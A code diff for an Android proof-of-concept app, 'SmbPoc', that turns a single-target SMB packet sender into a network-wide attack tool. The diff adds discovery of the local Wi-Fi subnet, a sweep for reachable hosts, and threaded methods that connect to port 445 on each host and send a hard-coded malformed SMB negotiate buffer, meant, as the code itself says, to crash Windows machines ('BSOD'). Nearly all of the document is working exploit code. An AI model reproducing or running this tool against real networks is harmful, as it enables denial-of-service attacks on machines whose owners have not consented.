@@ -1,18 +1,29 @@
 package info.lamatricexiste.smbpoc;
 
+import java.io.IOException;
 import java.io.OutputStream;
+import java.lang.Thread.UncaughtExceptionHandler;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
+import java.util.ArrayList;
+import java.util.List;
 
 import android.app.Activity;
 import android.content.Context;
 import android.net.DhcpInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
+import android.util.Log;
 import android.view.View;
+import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.EditText;
+import android.widget.ListView;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 
 
@@ -31,115 +42,201 @@ public class SmbPoc extends Activity
         0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,0x02,0x53,0x4d,
         0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00
     };
-    final private int port = 445;
-    private InetAddress ip_host = null;
-    private InetAddress ip_net = null;
-    private InetAddress ip_bc = null;
-    private WifiManager wifi = null;
-    private EditText ipedit = null;
-    private TextView textview = null;
-    private String output = "";
+    private final int            TIMEOUT  = 500;
+    final private int            PORT     = 445;
+    private InetAddress          ip_net   = null;
+    private InetAddress          ip_bc    = null;
+    private InetAddress          host_id  = null;
+    private WifiManager          wifi     = null;
+    private DhcpInfo             dhcp     = null;
+    private EditText             ipedit   = null;
+    private ListView             list     = null;
+    public  List<InetAddress>    hosts    = new ArrayList<InetAddress>();
+    private List<String>         model    = new ArrayList<String>();
+    private ArrayAdapter<String> adapter  = null;
+    private Handler        messageHandler = null;
+    private ProgressBar               bar = null;
+
 
     @Override
     public void onCreate(Bundle savedInstanceState)
     {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
+        TextView info = (TextView) findViewById(R.id.info); 
         ipedit = (EditText) findViewById(R.id.ip);
-        textview = (TextView) findViewById(R.id.output);
         Button btn = (Button) findViewById(R.id.btn);
+        Button btn1 = (Button) findViewById(R.id.btn1);
+        bar=(ProgressBar)findViewById(R.id.progress);
+        adapter = new ArrayAdapter<String>(this, R.layout.list, model);
+        list = (ListView) findViewById(R.id.output);
+        list.setAdapter(adapter);
+
+//        addText(Integer.toString(getIpByStr("0.255.255.255").hashCode()));
 
         wifi = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
         if(wifi.isWifiEnabled()) {
+            dhcp = wifi.getDhcpInfo();
             ip_bc = getBroadcastIP();
             ip_net = getNetIP();
+            host_id = getHostId();
+            
+//            ip_bc = getIpByStr("172.22.255.255");
+//            ip_net = getIpByStr("172.22.0.0");
+//            host_id = getIpByStr("0.0.255.255");
+            
+            info.setText("IP: " + getIp(dhcp.ipAddress).getHostAddress() +
+            		"  Network: " + ip_net.getHostAddress()+
+                    "  Broadcast: "+ ip_bc.getHostAddress());
+        }
+        else {
+            addText("No available network");
         }
        
         btn.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) {
+                bar.setProgress(0);
                 launchAttack();
             }
         });
+       
+        btn1.setOnClickListener(new View.OnClickListener() {
+            public void onClick(View v) {
+                
+            }
+        });
+        
+        messageHandler = new Handler() {
+            @Override
+            public void handleMessage(Message msg) {
+                bar.incrementProgressBy(1);
+                /*String text = "";
+                switch(msg.what){
+                case 0:
+                    text = "Packet Sent";
+                    break;
+                case 1:
+                    text = "Socket Exception";
+                    break;
+                case 2:
+                    text = "I/O Exception";
+                    break;
+                case 3:
+                    text = "uncaught Exception";
+                    break;
+                default:
+                    text = getIp(msg.what).toString();
+                }*/
+                addText(getIp(msg.what).toString());
+            }
+        };
     }
     
     private void addText(String text){
-        output = text + "\n" + output;
-        textview.setText(output);
+        adapter.add(text);
+        list.setSelection(list.FOCUS_DOWN);
     }
     
     private void launchAttack(){
         String input = ipedit.getText().toString();
         if(input.length()!=0){
-            addText("NOT EMPTY ("+input.length()+")");
-            try {
-                ip_host = InetAddress.getByName(ipedit.getText().toString());
-                hackthis();
-            } catch (UnknownHostException e) {
-                ip_host = null;
-                addText(e.getMessage());
+            InetAddress ip_host = getIpByStr(ipedit.getText().toString());
+            if(ip_host!=null){
+                try {
+                    bar.setMax(1);
+                    hackthis(ip_host);
+                    bar.incrementProgressBy(1);
+                } catch (Exception e) {
+                    addText(e.getMessage());
+                }
             }
         }
         else {
             if(ip_bc!=null && ip_net!=null){
-                String ip_bc_str = ip_bc.getHostAddress();
                 String ip_net_str = ip_net.getHostAddress();
+                String[] ip_net_split = ip_net.getHostAddress().split("\\.");
+                String[] ip_bc_split = ip_bc.getHostAddress().split("\\.");
                 
-                int dotpos = ip_bc_str.lastIndexOf(".");
-                Integer start = Integer.parseInt(ip_net_str.substring(dotpos+1, ip_net_str.length()))+1;
-                Integer end = Integer.parseInt(ip_bc_str.substring(dotpos+1, ip_bc_str.length()))-1;
-
-                String ip_start = ip_net_str.substring(0, dotpos);
-                for(int i=start; i<end; i++){
-                    try {
-                        ip_host = InetAddress.getByName(ip_start+"."+i);
-                        hackthis();
-                    } catch (UnknownHostException e) {
-                        addText(e.getMessage());
+                try{
+                    switch (host_id.hashCode()) {
+                    
+                    case 7:
+                    case 255:
+                    case 65535:
+                    case 16777215:
+                        // 1.0.0.1 to 126.255.255.254 255.255.255.0
+                        Integer start = Integer.parseInt(ip_net_split[(ip_net_split.length-1)])+1;
+                        Integer end = Integer.parseInt(ip_bc_split[(ip_bc_split.length-1)])+1;
+                        String ip_start = ip_net_str.substring(0, ip_net_str.lastIndexOf("."));
+                        for(int i=start; i<end; i++){
+                            InetAddress ip_host = InetAddress.getByName(ip_start+"."+i);
+                            if(ip_host.isReachable(TIMEOUT)){
+                                hosts.add(ip_host);
+                            }
+                        }
+                        bar.setMax(end-1);
+                        launchThreadAttack();
+                        break;
+                        
+//                    case 65535:
+//                        // 128.1.0.1 to 191.255.255.254 255.255.0.0
+//                        Integer s1 = Integer.parseInt(ip_net_split[(ip_net_split.length-2)]);
+//                        Integer e1 = Integer.parseInt(ip_bc_split[(ip_bc_split.length-2)]);
+//                        Integer s2 = Integer.parseInt(ip_net_split[(ip_net_split.length-1)]);
+//                        Integer e2 = Integer.parseInt(ip_bc_split[(ip_bc_split.length-1)]);
+//                        String ip1 = ip_net_str.substring(0, ip_net_str.indexOf(".", 4));
+//                        for(int i=s1; i<=e1; i++){
+//                            for(int j=s2; j<=e2; j++){
+//                                ip_host = InetAddress.getByName(ip1+"."+i+"."+j);
+//                                hosts.add(ip_host);
+//                            }
+//                        }
+////                        launchThreadAttack();
+//                        break;
+//                        
+//                    case 16777215:
+//                        // 192.0.1.1 to 223.255.254.254 255.0.0.0
+//                        break;
+                        
                     }
+                }
+                catch (IllegalArgumentException e) {
+                    addText(e.getMessage());
+                }
+                catch (UnknownHostException e) {
+                    addText(e.getMessage());
+                }
+                catch (IOException e) {
+                    addText(e.getMessage());
                 }
             }
         }
     }
     
-    private void hackthis(){
-        try {
-            ip_host.isReachable(500);
-            
-            try {
-                Thread.sleep(2000);
-            } catch (InterruptedException e) {}
-            
-            Socket s = new Socket(ip_host, port);
-            OutputStream out = s.getOutputStream();
-            
-            for(int b: buff){
-                out.write(b);
-            }
-            
-            out.flush();
-            out.close();
-            s.close();
-            
-            addText(ip_host.getHostAddress()+" has SMB and maybe got BSOD'ed");
-        }
-        catch (java.net.UnknownHostException e){
-            addText(ip_host + " " + e.getMessage());
-        }
-        catch (java.io.IOException e){
-            addText(ip_host + " " + e.getMessage());
-        }
+    private InetAddress getHostId(){
+        int network = ~dhcp.netmask;
+        return getIp(network);
     }
 
     private InetAddress getNetIP(){
-        DhcpInfo dhcp = wifi.getDhcpInfo();
         int network = (dhcp.ipAddress & dhcp.netmask);
         return getIp(network);
     }
 
     private InetAddress getBroadcastIP(){
-        DhcpInfo dhcp = wifi.getDhcpInfo();
         int broadcast = (dhcp.ipAddress & dhcp.netmask) | ~dhcp.netmask;
         return getIp(broadcast);
+    }
+
+    private InetAddress getIpByStr(String ip) {
+        try {
+            return InetAddress.getByName(ip);
+        }
+        catch (java.net.UnknownHostException e) {
+            addText(e.getMessage());
+            return null;
+        }
+
     }
     
     private InetAddress getIp(int ip_int){
@@ -155,4 +252,47 @@ public class SmbPoc extends Activity
             return null;
         }
     }
+
+/**
+ * Thread
+ */  
+    public void launchThreadAttack(){
+        for(final InetAddress h : hosts){
+            Thread t = new Thread() {
+                public void run(){
+                    int errcode = 0;
+                    try {
+                        hackthis(h);
+//                        errcode = Integer.getInteger(h.toString());
+                    } catch (Throwable t) {
+                        addText(t.getMessage());
+                    } 
+                    messageHandler.sendMessage(Message.obtain(messageHandler, errcode)); 
+                }
+            };
+            t.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
+                @Override
+                public void uncaughtException(Thread thread, Throwable ex) {
+                    messageHandler.sendMessage(Message.obtain(messageHandler, 3)); 
+                }
+            });
+            t.start();
+        }
+    }
+    
+    public void hackthis(InetAddress h) throws Exception{
+            Socket s = new Socket();
+            s.bind(null);
+            s.connect(new InetSocketAddress(h, PORT), TIMEOUT);
+            OutputStream out = s.getOutputStream();
+            for(int b: buff){
+                out.write(b);
+            }
+            out.close();
+            s.close();
+    }
+    
+/*
+ * End Thread
+ **/
 }
